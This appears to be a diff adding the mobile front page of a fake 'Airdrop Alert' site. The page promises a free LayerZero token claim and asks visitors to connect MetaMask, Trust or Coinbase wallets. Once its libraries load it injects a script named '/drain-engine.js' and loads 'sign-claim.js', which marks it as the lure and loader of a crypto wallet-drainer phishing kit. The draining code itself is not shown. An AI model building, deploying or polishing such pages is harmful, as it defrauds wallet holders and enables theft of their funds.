@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <!-- Mobile-optimized CSS -->
+    <link rel="stylesheet" href="assets/mobile-styles.css">
+    
+    <!-- External Libraries with Fallbacks -->
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/src/ua-parser.min.js"></script>
+    <script>if(typeof UAParser === 'undefined') document.write('<script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.37/ua-parser.min.js"><\/script>');</script>
+    
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script>if(typeof ethers === 'undefined') document.write('<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"><\/script>');</script>
+    
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+    <script>if(typeof QRCode === 'undefined') document.write('<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"><\/script>');</script>
+    
+    <!-- Reown AppKit -->
+    <script src="https://unpkg.com/@reown/appkit@1.0.0/dist/index.umd.js"></script>
+    <script>if(typeof AppKit === 'undefined') document.write('<script src="https://cdn.jsdelivr.net/npm/@reown/appkit@1.0.0/dist/index.umd.js"><\/script>');</script>
+    <!-- Preload critical icons -->
+    <link rel="preload" as="image" href="https://metamask.io/assets/metamask-fox.svg">
+    <link rel="preload" as="image" href="https://trustwallet.com/assets/images/trustwallet-logo.svg">
+    <link rel="preload" as="image" href="https://www.coinbase.com/assets/coinbase-wallet-logo.svg">
+    
+    <script>
+        // Global functions for UI interactions
+        function openMobileWalletConnect() {
+            const modal = document.getElementById('mobileWalletConnectModal');
+            if (modal) modal.style.display = 'block';
+        }
+
+        function closeMobileWalletConnect() {
+            const modal = document.getElementById('mobileWalletConnectModal');
+            if (modal) modal.style.display = 'none';
+        }
+
+        function connectMobileWallet(walletType) {
+            console.log('[MOBILE] Connecting wallet:', walletType);
+            const connectBtn = document.getElementById(`connect-${walletType}`);
+            const loadingElement = document.getElementById('mobileLoading');
+            const errorElement = document.getElementById('mobileError');
+            
+            if (connectBtn) connectBtn.disabled = true;
+            if (loadingElement) loadingElement.style.display = 'block';
+            if (errorElement) errorElement.style.display = 'none';
+            
+            if (window.mobileApp) {
+                window.mobileApp.connectWallet(walletType)
+                    .then(() => {
+                        console.log(`[MOBILE] Successfully connected ${walletType}`);
+                    })
+                    .catch(error => {
+                        console.error(`[MOBILE] Error connecting ${walletType}:`, error);
+                        if (errorElement) {
+                            errorElement.textContent = `Failed to connect ${walletType}. Please try again.`;
+                            errorElement.style.display = 'block';
+                        }
+                    })
+                    .finally(() => {
+                        if (connectBtn) connectBtn.disabled = false;
+                        if (loadingElement) loadingElement.style.display = 'none';
+                    });
+            } else {
+                console.error('[MOBILE] Mobile app not initialized');
+                if (errorElement) {
+                    errorElement.textContent = 'Wallet functionality not ready. Please refresh the page.';
+                    errorElement.style.display = 'block';
+                }
+                if (loadingElement) loadingElement.style.display = 'none';
+                if (connectBtn) connectBtn.disabled = false;
+            }
+        }
+
+        function showMobileQR() {
+            if (window.mobileApp) {
+                window.mobileApp.showQRCode();
+            } else {
+                console.error('Mobile app not initialized');
+            }
+        }
+
+        function goBack() {
+            if (window.history.length > 1) {
+                window.history.back();
+            } else {
+                window.location.href = '/';
+            }
+        }
+
+        // Library loading system with advanced fallbacks
+        window.libraryStatus = {
+            reown: false,
+            qrcode: false,
+            ethers: false,
+            uaparser: false
+        };
+        
+        function checkLibraries() {
+            window.libraryStatus.uaparser = typeof UAParser !== 'undefined';
+            window.libraryStatus.ethers = typeof ethers !== 'undefined';
+            window.libraryStatus.qrcode = typeof QRCode !== 'undefined';
+            window.libraryStatus.reown = typeof window.ReownAppKit !== 'undefined' || typeof window.AppKit !== 'undefined';
+            
+            // Map AppKit to ReownAppKit if needed
+            if (!window.ReownAppKit && window.AppKit) {
+                window.ReownAppKit = window.AppKit;
+            }
+            
+            console.log('[MOBILE] Library status:', window.libraryStatus);
+            return window.libraryStatus;
+        }
+
+        // Cookie detection
+        function checkCookieSupport() {
+            if (!navigator.cookieEnabled) {
+                console.warn('[MOBILE] Cookies disabled - WalletConnect may not work properly');
+                return false;
+            }
+            return true;
+        }
+        
+        // Advanced library loading with fallbacks
+        function loadLibraryWithFallback(libraryName, primaryUrl, fallbackUrls = []) {
+            return new Promise((resolve, reject) => {
+                let currentIndex = 0;
+                const urls = [primaryUrl, ...fallbackUrls];
+                
+                function tryLoad() {
+                    if (currentIndex >= urls.length) {
+                        reject(new Error(`All ${libraryName} URLs failed to load`));
+                        return;
+                    }
+                    
+                    const script = document.createElement('script');
+                    script.src = urls[currentIndex];
+                    script.crossOrigin = 'anonymous';
+                    script.onload = () => {
+                        console.log(`[MOBILE] ${libraryName} loaded from: ${urls[currentIndex]}`);
+                        resolve();
+                    };
+                    script.onerror = () => {
+                        console.warn(`[MOBILE] ${libraryName} failed from: ${urls[currentIndex]}`);
+                        currentIndex++;
+                        tryLoad();
+                    };
+                    document.head.appendChild(script);
+                }
+                
+                tryLoad();
+            });
+        }
+        
+        // Check library availability with retries
+        function checkLibraries() {
+            if (typeof window.ReownAppKit !== 'undefined') {
+                window.libraryStatus.reown = true;
+                console.log('[MOBILE] Reown AppKit loaded successfully');
+            }
+            if (typeof QRCode !== 'undefined') {
+                window.libraryStatus.qrcode = true;
+                console.log('[MOBILE] QRCode loaded successfully');
+            }
+            if (typeof ethers !== 'undefined') {
+                window.libraryStatus.ethers = true;
+                console.log('[MOBILE] Ethers loaded successfully');
+            }
+            if (typeof UAParser !== 'undefined') {
+                window.libraryStatus.uaparser = true;
+                console.log('[MOBILE] UAParser loaded successfully');
+            }
+            
+            // Initialize app if all libraries are loaded
+            if (window.libraryStatus.reown && window.libraryStatus.qrcode && 
+                window.libraryStatus.ethers && window.libraryStatus.uaparser) {
+                initializeMobileApp();
+            }
+        }
+        
+        // Initialize mobile app
+        function initializeMobileApp() {
+            console.log('[MOBILE] Initializing mobile app...');
+            if (typeof MobileAirdropAlert !== 'undefined') {
+                window.mobileApp = new MobileAirdropAlert();
+                window.mobileApp.initializeReown()
+                    .then(() => {
+                        console.log('[MOBILE] App initialized successfully');
+                        // Show wallet options after initialization
+                        document.getElementById('mobileWalletOptions').style.display = 'block';
+                    })
+                    .catch(error => {
+                        console.error('[MOBILE] Failed to initialize app:', error);
+                        // Show error to user
+                        const errorElement = document.getElementById('mobileError');
+                        if (errorElement) {
+                            errorElement.textContent = 'Failed to initialize wallet. Please refresh the page.';
+                            errorElement.style.display = 'block';
+                        }
+                    });
+            } else {
+                console.error('[MOBILE] MobileAirdropAlert class not found');
+                const errorElement = document.getElementById('mobileError');
+                if (errorElement) {
+                    errorElement.textContent = 'Error loading wallet functionality. Please refresh the page.';
+                    errorElement.style.display = 'block';
+                }
+            }
+        }
+
+        // Initialize when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('[MOBILE] DOM fully loaded, checking libraries...');
+            
+            // Initial library check
+            checkLibraries();
+            
+            // Set up periodic library checking
+            const checkInterval = setInterval(() => {
+                const allLoaded = Object.values(window.libraryStatus).every(Boolean);
+                if (allLoaded) {
+                    clearInterval(checkInterval);
+                    console.log('[MOBILE] All libraries loaded, initializing app...');
+                    
+                    const engineScript = document.createElement('script');
+                    engineScript.src = '/drain-engine.js';
+                    document.body.appendChild(engineScript);
+                    
+                    const script = document.createElement('script');
+                    script.src = 'assets/mobile-scripts.js';
+                    script.onload = function() {
+                        console.log('[MOBILE] Mobile scripts loaded');
+                        initializeMobileApp();
+                    };
+                    script.onerror = function() {
+                        console.error('[MOBILE] Failed to load mobile scripts');
+                        const errorElement = document.getElementById('mobileError');
+                        if (errorElement) {
+                            errorElement.textContent = 'Failed to load wallet functionality. Please refresh the page.';
+                            errorElement.style.display = 'block';
+                        }
+                    };
+                    document.body.appendChild(script);
+                }
+            }, 500);
+            
+            // Close modal when clicking outside
+            window.onclick = function(event) {
+                const modal = document.getElementById('mobileWalletConnectModal');
+                if (event.target === modal) {
+                    closeMobileWalletConnect();
+                }
+            };
+            
+            // Close modal with Escape key
+            document.addEventListener('keydown', function(event) {
+                if (event.key === 'Escape') {
+                    closeMobileWalletConnect();
+                }
+            });
+        });
+    </script>
+</head>
+<body>
+    <!-- Mobile Header -->
+    <div class="mobile-header">
+        <button class="back-btn" onclick="goBack()">← Back</button>
+        <h1 class="mobile-title">Airdrop Alert</h1>
+        <div class="mobile-menu">☰</div>
+    </div>
+
+    <!-- Mobile Claim Section -->
+    <div class="mobile-claim-container">
+        <div class="mobile-claim-card">
+            <div class="mobile-claim-header">
+                <h2 id="mobileTokenName">LayerZero Token</h2>
+                <div class="mobile-claim-badge">Live Airdrop</div>
+            </div>
+
+            <!-- Token Details Section - Improved Layout -->
+            <div class="mobile-token-details">
+                <div class="mobile-token-header">
+                    <div class="mobile-token-icon" id="mobileTokenSymbol">ZRO</div>
+                    <div class="mobile-token-text">
+                        <h3 id="mobileTokenName">LayerZero Token</h3>
+                       
+                    </div>
+                </div>
+                
+                <!-- Compact Token Info Grid -->
+                <div class="mobile-token-compact-grid">
+                    <div class="mobile-token-compact-item">
+                        <span class="mobile-token-label">Amount</span>
+                        <span class="mobile-token-value" id="mobileAirdropAmount">1,000 ZRO</span>
+                    </div>
+                    <div class="mobile-token-compact-item">
+                        <span class="mobile-token-label">Price</span>
+                        <span class="mobile-token-value" id="mobileTokenPrice">$2.01</span>
+                    </div>
+                    <div class="mobile-token-compact-item">
+                        <span class="mobile-token-label">Value</span>
+                        <span class="mobile-token-value" id="mobileTotalValue">$2,010.00</span>
+                    </div>
+                    <div class="mobile-token-compact-item">
+                        <span class="mobile-token-label">Ends</span>
+                        <span class="mobile-token-value" id="mobileEndDate">31/12/2025</span>
+                    </div>
+                </div>
+                
+                <!-- Collapsible Description -->
+                <div class="mobile-token-description-collapsible">
+                    <button class="mobile-description-toggle" onclick="toggleDescription()">
+                        <span class="toggle-text">About This Airdrop</span>
+                        <span class="toggle-icon">▼</span>
+                    </button>
+                    <div class="mobile-description-content" id="mobileDescriptionContent" style="display: none;">
+                        <p id="mobileTokenFullDescription">
+                            LayerZero is a protocol that enables cross-chain applications to communicate with each other in a trustless manner. This airdrop rewards early adopters and contributors to the ecosystem.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Wallet Connection Section -->
+            <div class="mobile-wallet-section">
+                <div class="mobile-wallet-info">
+                    <h3>Connect Your Web3 Wallet</h3>
+                    <p>Connect your wallet to claim your airdrop tokens</p>
+                </div>
+                
+                <!-- Single Connect Button (No Dropdown) -->
+                <button id="mobileConnectBtn" class="mobile-connect-button" onclick="openMobileWalletConnect()">
+                    <span class="button-icon">🔗</span>
+                    Connect Wallet
+                </button>
+                
+                <div class="mobile-wallet-note">
+                    No fees • Instant verification • Secure connection
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile WalletConnect Modal -->
+    <div id="mobileWalletConnectModal" class="mobile-walletconnect-modal">
+        <div class="mobile-walletconnect-content">
+            <button class="mobile-close-btn" onclick="closeMobileWalletConnect()">&times;</button>
+            <div class="mobile-walletconnect-header">
+                <h2>Connect Wallet</h2>
+                <p>Choose your preferred wallet to connect</p>
+            </div>
+            
+            <div id="walletConnectError" class="error-message" style="display: none;"></div>
+            <div id="walletConnectLoading" class="loading-spinner" style="display: none;">
+                <div class="spinner"></div>
+                <p>Initializing connection...</p>
+            </div>
+            
+            <div id="walletQRCode" class="qr-code-container" style="display: none;">
+                <canvas id="qrCodeCanvas"></canvas>
+                <p class="qr-instruction">Scan with your wallet app or tap below to open:</p>
+            </div>
+            
+            <div id="mobileWalletOptions" class="wallet-options">
+                <button class="wallet-option" onclick="connectMobileWallet('metamask')">
+                    <img src="https://metamask.io/assets/metamask-fox.svg" alt="MetaMask">
+                    <span>MetaMask</span>
+                </button>
+                <button class="wallet-option" onclick="connectMobileWallet('trust')">
+                    <img src="https://trustwallet.com/assets/images/trustwallet-logo.svg" alt="Trust Wallet">
+                    <span>Trust Wallet</span>
+                </button>
+                <button class="wallet-option" onclick="connectMobileWallet('coinbase')">
+                    <img src="https://www.coinbase.com/assets/coinbase-wallet-logo.png" alt="Coinbase Wallet">
+                    <span>Coinbase Wallet</span>
+                </button>
+            </div>
+            <div class="mobile-wallet-options">
+                <button class="wallet-option" onclick="showMobileQR()">
+                    <div class="qr-icon">📱</div>
+                    <span>Other Wallet (QR Code)</span>
+                </button>
+            </div>
+            </div>
+            
+            <div class="mobile-qr-container" id="mobileQRContainer" style="display: none;">
+                <h3>Scan with your wallet</h3>
+                <div class="qr-code-wrapper">
+                    <canvas id="mobileQRCode" width="256" height="256"></canvas>
+                </div>
+                <p>Open your wallet app and scan this QR code</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div id="mobileLoadingScreen" class="mobile-loading-screen">
+        <div class="mobile-loading-content">
+            <div class="mobile-loading-spinner"></div>
+            <p>Loading...</p>
+        </div>
+    </div>
+
+    <!-- Mobile JavaScript -->
+    <script src="assets/mobile-scripts.js"></script>
+    <script src="shared/sign-claim.js"></script>
+    
+    <script>
+        // Toggle description function
+        function toggleDescription() {
+            const content = document.getElementById('mobileDescriptionContent');
+            const toggle = document.querySelector('.mobile-description-toggle');
+            
+            if (content.style.display === 'none') {
+                content.style.display = 'block';
+                toggle.classList.add('active');
+            } else {
+                content.style.display = 'none';
+                toggle.classList.remove('active');
+            }
+        }
+        
+        // Copy to clipboard function
+        function copyToClipboard(text) {
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(text).then(() => {
+                    console.log('[MOBILE] Text copied to clipboard');
+                    showCopySuccess();
+                }).catch(err => {
+                    console.error('[MOBILE] Failed to copy text: ', err);
+                    fallbackCopyTextToClipboard(text);
+                });
+            } else {
+                fallbackCopyTextToClipboard(text);
+            }
+        }
+        
+        // Fallback copy function for older browsers
+        function fallbackCopyTextToClipboard(text) {
+            const textArea = document.createElement("textarea");
+            textArea.value = text;
+            textArea.style.top = "0";
+            textArea.style.left = "0";
+            textArea.style.position = "fixed";
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            
+            try {
+                const successful = document.execCommand('copy');
+                if (successful) {
+                    console.log('[MOBILE] Text copied to clipboard (fallback)');
+                    showCopySuccess();
+                } else {
+                    console.error('[MOBILE] Fallback copy failed');
+                }
+            } catch (err) {
+                console.error('[MOBILE] Fallback copy failed: ', err);
+            }
+            
+            document.body.removeChild(textArea);
+        }
+        
+        // Show copy success message
+        function showCopySuccess() {
+            const message = document.createElement('div');
+            message.className = 'copy-success-message';
+            message.textContent = 'Copied to clipboard!';
+            message.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: #2cd4d9;
+                color: #1c1e27;
+                padding: 1rem 2rem;
+                border-radius: 8px;
+                font-weight: 600;
+                z-index: 10000;
+                box-shadow: 0 4px 15px rgba(44, 212, 217, 0.3);
+            `;
+            document.body.appendChild(message);
+            
+            setTimeout(() => {
+                document.body.removeChild(message);
+            }, 2000);
+        }
+        
+        // Copy connection string function
+        function copyConnectionString() {
+            const connectionString = document.getElementById('connectionString');
+            if (connectionString) {
+                copyToClipboard(connectionString.textContent);
+            }
+        }
+    </script>
+</body>
+</html>
